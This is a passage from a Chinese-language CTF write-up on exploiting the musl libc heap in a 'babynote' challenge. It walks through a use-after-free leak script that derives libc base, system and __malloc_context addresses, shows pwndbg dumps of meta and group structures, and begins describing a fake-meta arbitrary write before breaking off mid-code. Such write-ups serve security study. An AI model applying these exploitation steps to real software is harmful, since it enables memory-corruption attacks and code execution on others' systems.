&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;u&gt;musl 的堆比较特殊，meta 页是按照顺序申请的，而且与 group 页隔离。当同一个 size 的 meta 分配满之后，如果继续申请，会使用 avail_meta 保留的一个 meta 地址，当然这了 meta 是全新的。而且，一旦申请后，malloc_context active 数组对应位置就会保留正在分配的 meta. 同时会将这两个 meta 的 prev next 设置，形成双链表。如果其中一个 meta 满无法分配，或者被 free，就会解开连表。full_meta 的 prev 和 next 被清零。&lt;/u&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;泄露libc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露libc&#34;&gt;#&lt;/a&gt; 泄露 libc&lt;/h3&gt;
&lt;p&gt;回到题目，这里我们可以泄露 group 组的地址，slot 地址是在 libc 的基础上得到的，所以泄露出 heap 的用户区地址就可以得到里 libc 地址。&lt;/p&gt;
&lt;p&gt;我们利用堆风水，将链表的最后一个 bebynote 释放，存在 uaf，然后通过构造，拿到他的 note slot 作为一个新的 babynote, 这杨这里就储存了 heapd 的地址，然后泄露。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#slot full size is 0x2c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#slot full size is 0x6c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;#free the first note,the meta(0xc)is freed,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clean()					&lt;span class=&#34;comment&#34;&gt;#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#we alloc the last slot in meta(0x2c) for abynote,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;						&lt;span class=&#34;comment&#34;&gt;#.Reuse the 0 solt in meta(0xc) (malloc from bins),&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;						&lt;span class=&#34;comment&#34;&gt;#then reuse the free slot in meta(0x2c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#fill up meta2(0x2c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;f&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;f&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;0x28:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ss = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ss = r.recv(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+ss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ss  = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;0x&amp;#x27;&lt;/span&gt;+ss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(ss,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) -  &lt;span class=&#34;number&#34;&gt;0x29fdf0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout = libcbase + &lt;span class=&#34;number&#34;&gt;0x2a0e00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__malloc_context = &lt;span class=&#34;number&#34;&gt;0x2a1aa0&lt;/span&gt;+libcbase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libcbase : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;system : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;stdout : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stdout))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;泄露其他地址meta&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露其他地址meta&#34;&gt;#&lt;/a&gt; 泄露其他地址（meta）&lt;/h3&gt;
&lt;p&gt;这里，meta1 (0x2c) 还有一个 freed slot ，我们其实就是通过这个泄露的 heap。find 一个很重要的点就是，会 addname. 而且就算查不到也不出错，然后再将其释放，所以我们可以由此来重复利用这个 freed slot。find 的时候，这要 size 合适，就会将它返回给我们，然后在里面写入数据。并释放。之前我们说过，这里可以泄露 heap 地址，是因为他是我们 list 的最后一个 banynote,delete 后上一个 babynote 的 next 指针依旧指向这个 slot，所以导致泄露。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220420203251874.png&#34; alt=&#34;image-20220420203251874&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以我们可以进行任意地址读。将__malloc_context 的地址写在 note 的位置，就可以泄露，同时我们还可以改变 notesize, 控制泄露的长度。&lt;/p&gt;
&lt;p&gt;由于 musl 的堆管理机制，虽然与 glibc 完全不一样，但是感觉通过代码分析是更容易的。&lt;/p&gt;
&lt;h3 id=&#34;任意地址写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意地址写&#34;&gt;#&lt;/a&gt; 任意地址写&lt;/h3&gt;
&lt;p&gt;musl 的任意地址写与 glibc 的 unlink 核心想法一致，只不过是前面的检查方式不一样。我们一步步来分析。&lt;/p&gt;
&lt;p&gt;首先 musl 的堆块不会进入 bins，只有 meta 被释放的时候，才会加入 freed_meta 双链表。当 meta 分配出去的 slot 全部被释放的时候，meta 会被释放。&lt;/p&gt;
&lt;h4 id=&#34;meta的-结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meta的-结构&#34;&gt;#&lt;/a&gt; meta 的 结构&lt;/h4&gt;
&lt;p&gt;meta 结构一共占用 40bytes&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta*)&lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev = &lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next = &lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mem = &lt;span class=&#34;number&#34;&gt;0x7f6431216c30&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  avail_mask = &lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  freed_mask = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  last_idx = &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  freeable = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sizeclass = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  maplen = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;pwndbg&amp;gt; x/8gx 0x55555730d4f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;0x55555730d4f0:	0x000055555730d4f0	0x000055555730d4f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;0x55555730d500:	0x00007f6431216c30	0x0000000000000106&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;0x55555730d510:	0x00000000000000a9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;prev 与 next 分别指向上一个或者下一个 meta（meta 在 freed_meta 链表中）。mem 指向管理 meta 的 group，而 group 又包含的一下简单信息&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; group*)&lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  meta = &lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  active_idx = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\020&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pad = &lt;span class=&#34;string&#34;&gt;&amp;quot;\324\060WUU\000&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  storage = &lt;span class=&#34;number&#34;&gt;0x55555730d500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;0l!1d\177&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中很多信息我们不需要管信息，只要知道用户的使用的 slot 数据在 storage 里面。这里提一下，group 其实也可以看作是一个 slot，被另一个 “meta” 管理，这里提到这个是因为，free meta 的时候，除了会释放对应的 slot，还要释放对应的 group。slot 的储存结构也比较有意思，他并不会像 glibc 的 chunk 那样保留过多的本 slot 信息，只会用四字节来保留 slot 与 meta 的关系。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422192430250.png&#34; alt=&#34;image-20220422192430250&#34;&gt;&lt;/p&gt;
&lt;p&gt;1 这里是用户使用的区域，2 是 group 的信息，包括 meta&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; group*)&lt;span class=&#34;number&#34;&gt;0x7f6431216c30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  meta = &lt;span class=&#34;number&#34;&gt;0x55555730d4f0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  active_idx = &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pad = &lt;span class=&#34;string&#34;&gt;&amp;quot;\000\000\000\000\200\000&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  storage = &lt;span class=&#34;number&#34;&gt;0x7f6431216c40&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后，3 这，他也只想一个地址，这里你也是一个 meta，与后面 group 的 free 有关。&lt;/p&gt;
&lt;p&gt;slot 的堆头会保留与 base 的偏移，以及 slot 在 group 组的编号，通过偏移找到 base，也就是 group 的地址。&lt;/p&gt;
&lt;p&gt;下面我们来说检查，要想把 fake_meta 释放掉，要保证 meta 只有一个 freeadble, 可以是只有 1 个 slot，也可以是其他状况，因为这个会涉及 meta 的 avail_mask 以及 freed_mask，我建议是把 freed_mask 写成 0，这样在 free 函数里的一个循环时，直接跳出，减少工作量。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// atomic free without locking if this is neither first or last slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (;;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; freed = g-&amp;gt;freed_mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; avail = g-&amp;gt;avail_mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; mask = freed | avail;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!(mask&amp;amp;self));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!freed || mask+self==all) &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span 